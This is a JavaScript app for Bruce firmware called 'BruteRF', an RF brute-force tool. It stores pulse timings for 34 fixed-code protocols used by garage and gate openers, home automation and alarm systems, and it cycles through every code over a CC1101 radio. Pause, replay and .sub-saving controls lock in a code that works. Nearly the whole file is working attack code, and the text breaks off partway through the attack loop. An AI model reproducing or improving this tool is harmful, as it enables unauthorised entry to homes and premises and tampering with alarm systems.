/**
 * BruteRF v1.0.0 — Complete RF Brute-Force Tool for Bruce Firmware
 * ================================================================
 * Replaces firmware-hardcoded rf_bruteforce.cpp with an external JS app.
 *
 * v1.0.0 Changes:
 *   - Protocol categories with graphic icons (EU Garage, US Garage, Home Auto,
 *     Alarm, 868 MHz, Misc, ALL) — inspired by brute_screen.dart
 *   - Pause mode during attacks: press SEL to pause, then -1/+1 to navigate
 *     codes, Replay to retransmit, Save to write .sub file
 *   - Progress bar updates every 10 codes sent
 *   - .sub file saving with keyboard filename input (saved in /BruceRF/)
 *   - RAW Bruteforce mode: hex-value brute-force via subghz.transmit() API
 *     with configurable prefix, range bits, frequency, TE, delay, TX count
 *   - Improved splash screen with better logo
 *
 * Requires Bruce firmware with subghz.txSetup/txPulses/txEnd API.
 *
 * API used:
 *   subghz.txSetup(freq_mhz)  — init CC1101 for TX
 *   subghz.txPulses(array)    — send signed us pulses (+HIGH/-LOW)
 *   subghz.txEnd()            — deinit RF module
 *   subghz.transmit(hexStr, freqHz, te, count) — high-level TX (for RAW mode)
 *   storage.write({fs: "sd"|"littlefs", path: "/file.sub"}, data, "write")
 *   storage.mkdir(path)       — create directory (tries both fs)
 *   dialog.prompt(default, maxLen, title) — keyboard text input
 *
 * Author: Senape3000
 * License: Same as Bruce Firmware (GPL-3.0)
 */

// ============================================================================
// MODULE IMPORTS
// ============================================================================

var display = require("display");
var keyboardApi = require("keyboard");
var dialog = require("dialog");
var subghz = require("subghz");
var storage = require("storage");

// Display bindings
var width = display.width;
var height = display.height;
var color = display.color;
var drawFillRect = display.drawFillRect;
var drawRect = display.drawRect;
var drawString = display.drawString;
var setTextColor = display.setTextColor;
var setTextSize = display.setTextSize;
var drawRoundRect = display.drawRoundRect;
var drawFillRoundRect = display.drawFillRoundRect;
var drawLine = display.drawLine;
var drawCircle = display.drawCircle;
var drawFillCircle = display.drawFillCircle;
var drawTriangle = display.drawTriangle;
var drawFillTriangle = display.drawFillTriangle;

// Input bindings
var getPrevPress = keyboardApi.getPrevPress;
var getNextPress = keyboardApi.getNextPress;
var getSelPress = keyboardApi.getSelPress;
var getEscPress = keyboardApi.getEscPress;
var getAnyPress = keyboardApi.getAnyPress;

// Screen dimensions
var screenW = width();
var screenH = height();

// ============================================================================
// RESPONSIVE LAYOUT — computed from screen dimensions
// ============================================================================
// Baseline: 320×170 (Lilygo T-Embed CC1101). Scales to any screen size.
// Supported: 240×135, 240×240, 320×170, 320×240, 480×222, 480×320

var L = (function() {
    var o = {};
    var sy = screenH / 170;
    var sx = screenW / 320;
    function r(v) { return Math.round(v); }
    function rm(min, v) { return Math.max(min, Math.round(v)); }

    // Header & Footer
    o.hdrH  = rm(14, 18 * sy);
    o.hdrTY = r((o.hdrH - 8) / 2);
    o.ftrH  = rm(11, 14 * sy);
    o.ftrY  = screenH - o.ftrH;
    o.ftrTY = o.ftrY + r((o.ftrH - 8) / 2);

    // Horizontal margin
    o.mx = rm(4, 6 * sx);

    // Content zone (between header & footer)
    o.cTop = o.hdrH;
    o.cH   = o.ftrY - o.cTop;

    // Centered-message Y positions (for status/complete/error screens)
    o.msgY1 = o.cTop + r(o.cH * 0.16);
    o.msgY2 = o.cTop + r(o.cH * 0.28);
    o.msgY3 = o.cTop + r(o.cH * 0.40);
    o.msgY4 = o.cTop + r(o.cH * 0.52);
    o.msgYA = o.ftrY - rm(8, 16 * sy);  // action prompt near bottom

    // Info line spacing
    o.lineH = rm(10, 14 * sy);

    // Category list
    o.catH   = rm(14, 18 * sy);
    o.catY0  = o.cTop + 2;
    o.catVis = Math.floor((o.cH - 2) / o.catH);

    // Protocol list
    o.proH   = rm(10, 12 * sy);
    o.proY0  = o.cTop;
    o.proVis = Math.floor(o.cH / o.proH);

    // Main menu
    o.titleH  = rm(16, 22 * sy);
    o.titleY  = r(o.titleH * 0.12);
    o.subTY   = o.titleY + 10;
    o.mainY0  = o.titleH + rm(2, 4 * sy);
    o.mainH   = Math.max(12, Math.floor((o.ftrY - o.mainY0) / 7));
    o.mainInH = o.mainH - 2;

    // Settings items
    o.setH  = rm(12, 16 * sy);
    o.setY0 = o.cTop + 2;

    // Attack mode menu items
    o.amH  = rm(14, 18 * sy);
    o.amY0 = o.cTop + rm(2, 4 * sy);

    // RAW settings items
    o.rawH  = rm(12, 14 * sy);
    o.rawY0 = o.cTop + 2;

    // Attack progress display
    o.atkY1   = o.cTop + 2;
    o.atkY2   = o.atkY1 + o.lineH;
    o.atkY3   = o.atkY2 + o.lineH;
    o.atkBarY = o.atkY3 + o.lineH;
    o.atkBarH = rm(10, 16 * sy);
    o.atkErrY = o.atkBarY + o.atkBarH + 2;

    // Pause mode
    o.pHdrH  = rm(14, 20 * sy);
    o.pHdrTY = r((o.pHdrH - 8) / 2);
    o.pCSz   = screenH >= 200 ? 2 : 1;   // code textSize (smaller on tiny screens)
    o.pCW    = o.pCSz === 2 ? 12 : 6;    // code char width
    o.pCY    = o.pHdrH + rm(2, 4 * sy);  // code Y
    o.pNY    = o.pCY + (o.pCSz === 2 ? 16 : 8) + rm(1, 4 * sy); // code number Y
    o.pIY    = o.pNY + 8 + rm(1, 2 * sy);// info line Y
    o.pMY    = o.pIY + 8 + rm(2, 4 * sy);// menu start Y
    var _pa  = o.ftrY - o.pMY;
    o.pBSp   = Math.max(11, Math.floor(_pa / 6)); // btn spacing (fits 6 items)
    o.pBH    = Math.min(o.pBSp - 1, rm(10, 14 * sy)); // btn height

    // Protocol info screen
    o.infY0  = o.cTop + 2;
    o.infH   = rm(10, 12 * sy);
    o.infHS  = rm(12, 14 * sy);

    return o;
})();

// ============================================================================
// COLORS
// ============================================================================

var BLACK     = color(0, 0, 0);
var WHITE     = color(255, 255, 255);
var GREEN     = color(0, 200, 0);
var RED       = color(200, 0, 0);
var CYAN      = color(0, 200, 200);
var YELLOW    = color(220, 200, 0);
var GRAY      = color(80, 80, 80);
var DARKGRAY  = color(40, 40, 40);
var ORANGE    = color(220, 130, 0);
var BLUE      = color(60, 100, 255);
var PURPLE    = color(150, 80, 220);
var MAGENTA   = color(200, 50, 140);
var HEADERBG  = color(0, 40, 60);
var FOOTERBG  = color(0, 30, 30);
var BARBG     = color(30, 30, 30);
var BARFILL   = color(0, 180, 80);
var PAUSEBG   = color(20, 20, 40);
var SENAPE    = color(200, 180, 50);

// ============================================================================
// PROTOCOL DATABASE — 34 protocols + category tag
// ============================================================================
// Categories: "eu_garage", "us_garage", "home", "alarm", "868mhz", "misc"

var PROTOCOLS = [
    // --- EU Garage ---
    { name: "CAME",         cat: "eu_garage", t0: [-320, 640],   t1: [-640, 320],   pilot: [-11520, 320],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "NiceFlo",      cat: "eu_garage", t0: [-700, 1400],  t1: [-1400, 700],  pilot: [-25200, 700],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Ansonic",      cat: "eu_garage", t0: [-1111, 555],  t1: [-555, 1111],  pilot: [-19425, 555],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Holtek",       cat: "eu_garage", t0: [-870, 430],   t1: [-430, 870],   pilot: [-15480, 430],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "FAAC",         cat: "eu_garage", t0: [-1200, 400],  t1: [-400, 1200],  pilot: [-16000, 400],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "BFT",          cat: "eu_garage", t0: [-400, 800],   t1: [-800, 400],   pilot: [-12000, 400],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Clemsa",       cat: "eu_garage", t0: [-400, 800],   t1: [-800, 400],   pilot: [-12000, 400],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "GateTX",       cat: "eu_garage", t0: [-350, 700],   t1: [-700, 350],   pilot: [-11000, 350],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Phox",         cat: "eu_garage", t0: [-400, 800],   t1: [-800, 400],   pilot: [-12000, 400],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "PhoenixV2",    cat: "eu_garage", t0: [-500, 1000],  t1: [-1000, 500],  pilot: [-15000, 500],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Prastel",      cat: "eu_garage", t0: [-400, 800],   t1: [-800, 400],   pilot: [-12000, 400],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Doitrand",     cat: "eu_garage", t0: [-400, 800],   t1: [-800, 400],   pilot: [-12000, 400],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Princeton",    cat: "eu_garage", t0: [350, -1050, 350, -1050], t1: [1050, -350, 1050, -350], tF: [350, -1050, 1050, -350], pilot: [350, -10850], stop: [], freq: 433.92, bits: 12, mode: "tristate" },
    { name: "SMC5326",      cat: "eu_garage", t0: [320, -960, 320, -960],   t1: [960, -320, 960, -320],   tF: [320, -960, 960, -320],   pilot: [320, -11520], stop: [], freq: 433.42, bits: 12, mode: "tristate" },

    // --- US Garage ---
    { name: "Chamberlain",  cat: "us_garage", t0: [-870, 430],   t1: [-430, 870],   pilot: [],             stop: [-3000, 1000], freq: 315.0, bits: 12, mode: "binary" },
    { name: "Linear",       cat: "us_garage", t0: [500, -1500],  t1: [1500, -500],  pilot: [],             stop: [1, -21500], freq: 300.0, bits: 10, mode: "binary" },
    { name: "LiftMaster",   cat: "us_garage", t0: [400, -800],   t1: [800, -400],   pilot: [-15000, 400],  stop: [], freq: 315.0, bits: 12, mode: "binary" },
    { name: "Firefly",      cat: "us_garage", t0: [400, -800],   t1: [800, -400],   pilot: [400, -12000],  stop: [], freq: 300.0, bits: 10, mode: "binary" },
    { name: "LinearMega",   cat: "us_garage", t0: [500, -1000],  t1: [1000, -500],  pilot: [500, -15000],  stop: [], freq: 318.0, bits: 24, mode: "binary" },

    // --- Home Automation ---
    { name: "Dooya",        cat: "home", t0: [350, -700],   t1: [700, -350],   pilot: [350, -7000],   stop: [], freq: 433.92, bits: 24, mode: "binary" },
    { name: "Nero",         cat: "home", t0: [450, -900],   t1: [900, -450],   pilot: [450, -13500],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Magellen",     cat: "home", t0: [400, -800],   t1: [800, -400],   pilot: [400, -12000],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "IntertechnoV3",cat: "home", t0: [250, -250, 250, -1250], t1: [250, -1250, 250, -250], pilot: [250, -2500], stop: [250, -10000], freq: 433.92, bits: 32, mode: "binary" },

    // --- Alarm Systems ---
    { name: "EV1527",       cat: "alarm", t0: [320, -960],   t1: [960, -320],   pilot: [320, -9920],   stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Honeywell",    cat: "alarm", t0: [300, -600],   t1: [600, -300],   pilot: [300, -9000],   stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "EV1527_24b",   cat: "alarm", t0: [320, -960],   t1: [960, -320],   pilot: [320, -9920],   stop: [], freq: 433.92, bits: 24, mode: "binary" },
    { name: "Airforce",     cat: "alarm", t0: [350, -1050, 350, -1050], t1: [1050, -350, 1050, -350], pilot: [350, -10850], stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Unilarm",      cat: "alarm", t0: [350, -1050, 350, -1050], t1: [1050, -350, 1050, -350], pilot: [350, -10850], stop: [], freq: 433.42, bits: 12, mode: "binary" },

    // --- 868 MHz ---
    { name: "Hormann",      cat: "868mhz", t0: [500, -500],   t1: [1000, -500],  pilot: [500, -10000],  stop: [], freq: 868.35, bits: 12, mode: "binary" },
    { name: "Marantec",     cat: "868mhz", t0: [600, -1200],  t1: [1200, -600],  pilot: [600, -15000],  stop: [600, -25000], freq: 868.35, bits: 12, mode: "binary" },
    { name: "Berner",       cat: "868mhz", t0: [400, -800],   t1: [800, -400],   pilot: [400, -12000],  stop: [], freq: 868.35, bits: 12, mode: "binary" },

    // --- Misc ---
    { name: "StarLine",     cat: "misc", t0: [500, -1000],  t1: [1000, -500],  pilot: [-10000, 500],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "Tedsen",       cat: "misc", t0: [600, -1200],  t1: [1200, -600],  pilot: [-15000, 600],  stop: [], freq: 433.92, bits: 12, mode: "binary" },
    { name: "ELKA",         cat: "misc", t0: [400, -800],   t1: [800, -400],   pilot: [400, -12000],  stop: [], freq: 433.92, bits: 12, mode: "binary" }
];

// Category definitions with labels and colors
var CATEGORIES = [
    { id: "all",       label: "All Protocols",    col: WHITE,   iconCol: CYAN },
    { id: "eu_garage", label: "EU Garage",         col: CYAN,    iconCol: CYAN },
    { id: "us_garage", label: "US Garage",         col: BLUE,    iconCol: BLUE },
    { id: "home",      label: "Home Auto",         col: GREEN,   iconCol: GREEN },
    { id: "alarm",     label: "Alarm Systems",     col: RED,     iconCol: RED },
    { id: "868mhz",    label: "868 MHz",           col: PURPLE,  iconCol: PURPLE },
    { id: "misc",      label: "Miscellaneous",     col: ORANGE,  iconCol: ORANGE }
];

// ============================================================================
// APPLICATION STATE
// ============================================================================

var selectedCatIdx = 0;       // current category index
var selectedProtoIdx = 0;     // index within filtered list
var filteredProtos = [];      // protocols in current category
var attackRepeats = 3;
var interFrameDelay = 10;     // ms between code repeats
var attackRunning = false;
var customFreq = 0;           // 0 = use protocol default
var customBits = 0;           // 0 = use protocol default
var protoScrollTop = 0;       // scroll offset for protocol list
var catScrollTop = 0;         // scroll offset for category list

// RAW Bruteforce state
var rawPrefix = 0x445700;     // starting hex value (prefix)
var rawBits = 8;              // bits to iterate (range)
var rawDelay = 200;           // delay after each TX (ms)
var rawFreqHz = 433920000;    // frequency in Hz
var rawTe = 174;              // timing element (us)
var rawCount = 10;            // repeat count per TX

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

function abs(x) { return x < 0 ? -x : x; }

function toHex(n, digits) {
    var h = n.toString(16).toUpperCase();
    while (h.length < digits) h = "0" + h;
    return h;
}

function clearScreen() {
    drawFillRect(0, 0, screenW, screenH, BLACK);
}

/** Filter protocols by category id ("all" returns all) */
function filterProtocols(catId) {
    var result = [];
    for (var i = 0; i < PROTOCOLS.length; i++) {
        if (catId === "all" || PROTOCOLS[i].cat === catId) {
            result.push(PROTOCOLS[i]);
        }
    }
    return result;
}

/** Get tristate code string from integer */
function tristateStr(code, positions) {
    var s = "";
    var tmp = code;
    for (var d = 0; d < positions; d++) {
        var digit = tmp % 3;
        s += (digit === 0 ? "0" : (digit === 1 ? "1" : "F"));
        tmp = Math.floor(tmp / 3);
    }
    return s;
}

// ============================================================================
// UI DRAWING HELPERS
// ============================================================================

function drawHeader(title) {
    drawFillRect(0, 0, screenW, L.hdrH, HEADERBG);
    setTextSize(1);
    setTextColor(CYAN);
    var tw = title.length * 6;
    drawString(title, Math.floor((screenW - tw) / 2), L.hdrTY);
}

function drawFooter(text) {
    drawFillRect(0, L.ftrY, screenW, L.ftrH, FOOTERBG);
    setTextSize(1);
    setTextColor(GRAY);
    drawString(text, L.mx, L.ftrTY);
}

function drawProgressBar(x, y, w, h, pct) {
    drawFillRect(x, y, w, h, BARBG);
    var fillW = Math.floor(w * pct / 100);
    if (fillW > 0) drawFillRect(x, y, fillW, h, BARFILL);
    drawRect(x, y, w, h, GRAY);
    var pctStr = pct + "%";
    setTextSize(1);
    setTextColor(WHITE);
    var tw = pctStr.length * 6;
    drawString(pctStr, x + Math.floor((w - tw) / 2), y + Math.floor((h - 8) / 2));
}

function drawCentered(text, y, col) {
    setTextSize(1);
    setTextColor(col);
    var tw = text.length * 6;
    drawString(text, Math.floor((screenW - tw) / 2), y);
}

// ============================================================================
// CATEGORY ICONS — small 12x12 drawn with primitives
// ============================================================================

/**
 * Draw a category icon at position (x, y) with given color.
 * Icons are ~12x12 px, drawn with lines/shapes.
 */
function drawCategoryIcon(catId, x, y, col) {
    if (catId === "all") {
        // Grid icon (4 squares)
        drawFillRect(x, y, 5, 5, col);
        drawFillRect(x + 7, y, 5, 5, col);
        drawFillRect(x, y + 7, 5, 5, col);
        drawFillRect(x + 7, y + 7, 5, 5, col);
    } else if (catId === "eu_garage") {
        // House icon (EU garage)
        drawFillTriangle(x + 6, y, x, y + 6, x + 12, y + 6, col);
        drawFillRect(x + 2, y + 6, 8, 6, col);
        drawFillRect(x + 4, y + 8, 4, 4, BLACK); // door
    } else if (catId === "us_garage") {
        // Star icon (US)
        drawFillTriangle(x + 6, y, x + 3, y + 5, x + 9, y + 5, col);
        drawFillTriangle(x + 6, y + 12, x + 3, y + 7, x + 9, y + 7, col);
        drawFillRect(x + 2, y + 4, 8, 4, col);
    } else if (catId === "home") {
        // Lightbulb icon
        drawFillCircle(x + 6, y + 4, 4, col);
        drawFillRect(x + 4, y + 8, 5, 2, col);
        drawLine(x + 4, y + 11, x + 8, y + 11, col);
    } else if (catId === "alarm") {
        // Shield icon
        drawFillTriangle(x + 6, y + 12, x + 1, y + 5, x + 11, y + 5, col);
        drawFillRect(x + 1, y + 1, 10, 6, col);
        drawLine(x + 4, y + 4, x + 6, y + 7, WHITE);
        drawLine(x + 6, y + 7, x + 9, y + 2, WHITE);
    } else if (catId === "868mhz") {
        // Wave/signal icon
        drawCircle(x + 3, y + 6, 2, col);
        drawCircle(x + 3, y + 6, 5, col);
        drawCircle(x + 3, y + 6, 8, col);
    } else if (catId === "misc") {
        // Gear icon (simplified)
        drawFillCircle(x + 6, y + 6, 4, col);
        drawFillCircle(x + 6, y + 6, 2, BLACK);
        drawFillRect(x + 5, y, 2, 3, col);
        drawFillRect(x + 5, y + 9, 2, 3, col);
        drawFillRect(x, y + 5, 3, 2, col);
        drawFillRect(x + 9, y + 5, 3, 2, col);
    }
}

// ============================================================================
// PULSE ENCODING
// ============================================================================

function encodeBinary(proto, code, bits) {
    var pulses = [];
    for (var p = 0; p < proto.pilot.length; p++) pulses.push(proto.pilot[p]);
    for (var b = bits - 1; b >= 0; b--) {
        var bit = (code >> b) & 1;
        var t = bit ? proto.t1 : proto.t0;
        for (var j = 0; j < t.length; j++) pulses.push(t[j]);
    }
    for (var s = 0; s < proto.stop.length; s++) pulses.push(proto.stop[s]);
    return pulses;
}

function encodeTristate(proto, code, positions) {
    var pulses = [];
    for (var p = 0; p < proto.pilot.length; p++) pulses.push(proto.pilot[p]);
    var digits = [];
    var temp = code;
    for (var i = 0; i < positions; i++) {
        digits.push(temp % 3);
        temp = Math.floor(temp / 3);
    }
    for (var d = 0; d < positions; d++) {
        var t;
        if (digits[d] === 0)      t = proto.t0;
        else if (digits[d] === 1) t = proto.t1;
        else                       t = proto.tF || proto.t0;
        for (var j = 0; j < t.length; j++) pulses.push(t[j]);
    }
    for (var s = 0; s < proto.stop.length; s++) pulses.push(proto.stop[s]);
    return pulses;
}

// ============================================================================
// DE BRUIJN SEQUENCE GENERATOR
// ============================================================================

function generateDeBruijn(n) {
    if (n < 1 || n > 16) return null;
    var totalUnique = 1 << n;
    var seq = [];
    var visited = {};
    for (var i = 0; i < n; i++) seq.push(0);
    visited[0] = true;
    var mask = totalUnique - 1;
    var val = 0;
    for (var i = 0; i < totalUnique - 1; i++) {
        var nextOne  = ((val << 1) & mask) | 1;
        var nextZero = ((val << 1) & mask);
        if (!visited[nextOne]) {
            val = nextOne;
            visited[nextOne] = true;
            seq.push(1);
        } else {
            val = nextZero;
            visited[nextZero] = true;
            seq.push(0);
        }
    }
    return seq;
}

// ============================================================================
// .SUB FILE GENERATION & SAVE
// ============================================================================

/**
 * Build a Bruce .sub file string from pulse data.
 * @param {number} freqMhz — frequency in MHz
 * @param {number[]} pulses — signed microsecond pulse array
 * @returns {string} — .sub file content
 */
function buildSubFileContent(freqMhz, pulses) {
    var freqHz = Math.floor(freqMhz * 1000000);
    var content = "Filetype: Bruce SubGhz File\n";
    content += "Version 1\n";
    content += "Frequency: " + freqHz + "\n";
    content += "Preset: 0\n";
    content += "Protocol: RAW\n";
    // Split pulses into lines of max 512 values
    var line = "";
    var count = 0;
    for (var i = 0; i < pulses.length; i++) {
        if (count === 0) line = "RAW_Data:";
        line += " " + pulses[i];
        count++;
        if (count >= 512 || i === pulses.length - 1) {
            content += line + "\n";
            line = "";
            count = 0;
        }
    }
    return content;
}

/**
 * Save a code as .sub file. Opens keyboard for filename.
 * @param {object} proto — protocol
 * @param {number} code — the code value
 * @param {number} bits — bit count
 * @param {number} freqMhz — frequency
 * @param {boolean} isTristate — whether this is a tristate code
 * @returns {boolean} — true if saved successfully
 */
function saveCodeAsSub(proto, code, bits, freqMhz, isTristate) {
    // Build pulse data for the code
    var pulses;
    if (isTristate) {
        pulses = encodeTristate(proto, code, bits);
    } else {
        pulses = encodeBinary(proto, code, bits);
    }

    // Build default filename
    var defName = proto.name + "_";
    if (isTristate) {
        defName += tristateStr(code, bits);
    } else {
        defName += "0x" + toHex(code, Math.ceil(bits / 4));
    }

    // Get filename from user via keyboard (default is the code, title is "Save filename")
    var filename = dialog.prompt(defName, 32, "Save filename");
    if (!filename || filename.length === 0) return false;

    // Build file content
    var content = buildSubFileContent(freqMhz, pulses);

    // Try SD Card first, fallback to LittleFS
    var filesystems = ["sd", "littlefs"];
    var savedPath = null;
    var savedFs = null;

    for (var i = 0; i < filesystems.length; i++) {
        var fs = filesystems[i];
        var dir = "/BruceRF/";
        var fullPath = dir + filename + ".sub";

        // Create directory (mkdir ignores fs parameter, tries both automatically)
        storage.mkdir(dir);

        // Try to write with explicit filesystem
        var ok = storage.write({fs: fs, path: fullPath}, content, "write");
        if (ok) {
            savedPath = fullPath;
            savedFs = fs.toUpperCase();
            break;
        }
    }

    if (savedPath) {
        clearScreen();
        drawHeader("SAVED");
        drawCentered("Saved to " + savedFs + ":", L.msgY1, GREEN);
        setTextColor(WHITE);
        setTextSize(1);
        var tw = savedPath.length * 6;
        drawString(savedPath, Math.max(L.mx, Math.floor((screenW - tw) / 2)), L.msgY2);
        drawFooter("Press any key");
        while (!getAnyPress()) delay(50);
        return true;
    } else {
        clearScreen();
        drawHeader("ERROR");
        drawCentered("Failed to save file!", L.msgY2, RED);
        drawCentered("Check SD Card or storage", L.msgY3, YELLOW);
        drawFooter("Press any key");
        while (!getAnyPress()) delay(50);
        return false;
    }
}

// ============================================================================
// PAUSE MODE — Manual code testing during attack
// ============================================================================

/**
 * Enter pause mode during an attack. User can navigate codes with -1/+1,
 * replay current code, or save it as .sub file.
 *
 * @param {object} proto — protocol definition
 * @param {number} currentCode — code where attack was paused
 * @param {number} bits — bit count
 * @param {number} freqMhz — TX frequency
 * @param {number} totalCodes — max code count
 * @param {boolean} isTristate — tristate mode flag
 * @param {number} repeats — repeats per transmit
 * @param {number} frameDelay — inter-frame delay ms
 * @returns {object} — { action: "resume"|"cancel", code: newCode }
 */
function enterPauseMode(proto, currentCode, bits, freqMhz, totalCodes, isTristate, repeats, frameDelay) {
    var code = currentCode;
    var pauseIdx = 0; // 0=-1, 1=+1, 2=Replay, 3=Save, 4=Resume, 5=Cancel
    var items = ["-1 Code", "+1 Code", "Replay", "Save .sub", "Resume", "Cancel"];
    var itemCols = [CYAN, CYAN, GREEN, YELLOW, BLUE, RED];

    function codeDisplay() {
        if (isTristate) return tristateStr(code, bits);
        return "0x" + toHex(code, Math.ceil(bits / 4));
    }

    function drawPause() {
        clearScreen();
        // Paused header with pulsing style
        drawFillRect(0, 0, screenW, L.pHdrH, color(60, 30, 0));
        setTextSize(1);
        setTextColor(ORANGE);
        var hdr = "|| PAUSED — " + proto.name;
        var tw = hdr.length * 6;
        drawString(hdr, Math.floor((screenW - tw) / 2), L.pHdrTY);

        // Current code display — adaptive text size
        setTextSize(L.pCSz);
        setTextColor(WHITE);
        var cs = codeDisplay();
        var tw2 = cs.length * L.pCW;
        drawString(cs, Math.floor((screenW - tw2) / 2), L.pCY);

        // Code number
        setTextSize(1);
        setTextColor(GRAY);
        var numStr = "Code " + code + " / " + (totalCodes - 1);
        drawString(numStr, Math.floor((screenW - numStr.length * 6) / 2), L.pNY);

        // Frequency and protocol info
        setTextColor(CYAN);
        drawString(freqMhz + " MHz  " + bits + "b  " + proto.mode, L.mx, L.pIY);

        // Menu buttons
        var btnTxtOff = Math.max(1, Math.floor((L.pBH - 8) / 2));
        for (var i = 0; i < items.length; i++) {
            var y = L.pMY + i * L.pBSp;
            if (y + L.pBH > L.ftrY) break; // don't overflow footer

            if (i === pauseIdx) {
                drawFillRoundRect(L.mx, y, screenW - L.mx * 2, L.pBH, 3, HEADERBG);
                setTextColor(itemCols[i]);
            } else {
                setTextColor(GRAY);
            }
            setTextSize(1);
            drawString(items[i], L.mx + 8, y + btnTxtOff);

            // Show code hint for -1/+1
            if (i === 0 && code > 0) {
                var prev = isTristate ? tristateStr(code - 1, bits) : "0x" + toHex(code - 1, Math.ceil(bits / 4));
                setTextColor(DARKGRAY);
                drawString(prev, screenW - prev.length * 6 - L.mx - 2, y + btnTxtOff);
            }
            if (i === 1 && code < totalCodes - 1) {
                var next = isTristate ? tristateStr(code + 1, bits) : "0x" + toHex(code + 1, Math.ceil(bits / 4));
                setTextColor(DARKGRAY);
                drawString(next, screenW - next.length * 6 - L.mx - 2, y + btnTxtOff);
            }
        }

        drawFooter("UP/DN=Nav  SEL=Action  ESC=Resume");
    }

    drawPause();

    while (true) {
        if (getPrevPress()) {
            pauseIdx--;
            if (pauseIdx < 0) pauseIdx = items.length - 1;
            drawPause();
            delay(120);
        }
        if (getNextPress()) {
            pauseIdx++;
            if (pauseIdx >= items.length) pauseIdx = 0;
            drawPause();
            delay(120);
        }
        if (getSelPress()) {
            delay(200);
            if (pauseIdx === 0) {
                // -1 Code
                if (code > 0) {
                    code--;
                    // Transmit the new code
                    var pulses = isTristate ? encodeTristate(proto, code, bits) : encodeBinary(proto, code, bits);
                    for (var r = 0; r < repeats; r++) {
                        subghz.txPulses(pulses);
                        if (frameDelay > 0) delay(frameDelay);
                    }
                }
                drawPause();
            } else if (pauseIdx === 1) {
                // +1 Code
                if (code < totalCodes - 1) {
                    code++;
                    var pulses = isTristate ? encodeTristate(proto, code, bits) : encodeBinary(proto, code, bits);
                    for (var r = 0; r < repeats; r++) {
                        subghz.txPulses(pulses);
                        if (frameDelay > 0) delay(frameDelay);
                    }
                }
                drawPause();
            } else if (pauseIdx === 2) {
                // Replay current code
                var pulses = isTristate ? encodeTristate(proto, code, bits) : encodeBinary(proto, code, bits);
                // Show TX indicator
                drawFillRect(screenW - 30, L.pCY, 26, 12, RED);
                setTextSize(1);
                setTextColor(WHITE);
                drawString("TX", screenW - 26, L.pCY + 2);
                for (var r = 0; r < repeats; r++) {
                    subghz.txPulses(pulses);
                    if (frameDelay > 0) delay(frameDelay);
                }
                drawPause();
            } else if (pauseIdx === 3) {
                // Save .sub
                saveCodeAsSub(proto, code, bits, freqMhz, isTristate);
                drawPause();
            } else if (pauseIdx === 4) {
                // Resume
                return { action: "resume", code: code };
            } else if (pauseIdx === 5) {
                // Cancel
                return { action: "cancel", code: code };
            }
        }
        if (getEscPress()) {
            delay(200);
            return { action: "resume", code: code };
        }
        delay(30);
    }
}

// ============================================================================
// ATTACK FUNCTIONS — with pause support and 10-code progress update
// ============================================================================

/**
 * Binary brute-force attack with pause/manual control.
 */
function attackBinary(proto, bits, freq, repeats, frameDelay) {
    var total = 1 << bits;
    if (bits > 24) {
        clearScreen();
        drawHeader("WARNING");
        drawCentered("Keyspace: " + total + " codes", L.msgY1, YELLOW);
        drawCentered("This may take very long!", L.msgY2, ORANGE);
        drawCentered("SEL=Continue  ESC=Cancel", L.msgYA, GRAY);
        while (true) {
            if (getSelPress()) { delay(200); break; }
            if (getEscPress()) { return; }
            delay(50);
        }
    }

    attackRunning = true;
    clearScreen();
    drawHeader("BINARY: " + proto.name);

    if (!subghz.txSetup(freq)) {
        drawCentered("RF init failed!", L.msgY2, RED);
        delay(2000);
        attackRunning = false;
        return;
    }

    var startTime = Date.now();
    var codesSinceLastDraw = 0;
    var hexDigits = Math.ceil(bits / 4);

    // Draw initial progress
    drawFillRect(0, L.cTop, screenW, L.cH, BLACK);
    setTextSize(1);
    setTextColor(WHITE);
    drawString("Code: 0x" + toHex(0, hexDigits) + " / 0x" + toHex(total - 1, hexDigits), L.mx, L.atkY1);
    drawString("Freq: " + freq + " MHz", L.mx, L.atkY2);
    drawString("Speed: -- c/s", L.mx, L.atkY3);
    drawProgressBar(L.mx, L.atkBarY, screenW - L.mx * 2, L.atkBarH, 0);
    drawFooter("ESC=Stop  SEL=Pause | " + bits + "b");

    var i = 0;
    while (i < total) {
        // Check ESC = cancel
        if (getEscPress()) {
            clearScreen();
            drawHeader("CANCELLED");
            drawCentered("Stopped at code " + i + "/" + total, L.msgY2, YELLOW);
            delay(1500);
            break;
        }

        // Check SEL = pause (enter manual mode)
        if (getSelPress()) {
            delay(150);
            var result = enterPauseMode(proto, i, bits, freq, total, false, repeats, frameDelay);
            if (result.action === "cancel") {
                clearScreen();
                drawHeader("CANCELLED");
                drawCentered("Stopped at code " + result.code, L.msgY2, YELLOW);
                delay(1500);
                break;
            }
            // Resume from the returned code
            i = result.code;
            codesSinceLastDraw = 10; // force redraw
            clearScreen();
            drawHeader("BINARY: " + proto.name);
        }

        // Encode and transmit
        var pulses = encodeBinary(proto, i, bits);
        for (var r = 0; r < repeats; r++) {
            subghz.txPulses(pulses);
            if (frameDelay > 0) delay(frameDelay);
        }

        codesSinceLastDraw++;
        i++;

        // Update display every 10 codes
        if (codesSinceLastDraw >= 10) {
            codesSinceLastDraw = 0;
            var pct = Math.floor(i * 100 / total);
            var elapsed = (Date.now() - startTime) / 1000;
            var cps = elapsed > 0 ? Math.floor(i / elapsed) : 0;
            var eta = cps > 0 ? Math.floor((total - i) / cps) : 0;

            drawFillRect(0, L.cTop, screenW, L.cH, BLACK);
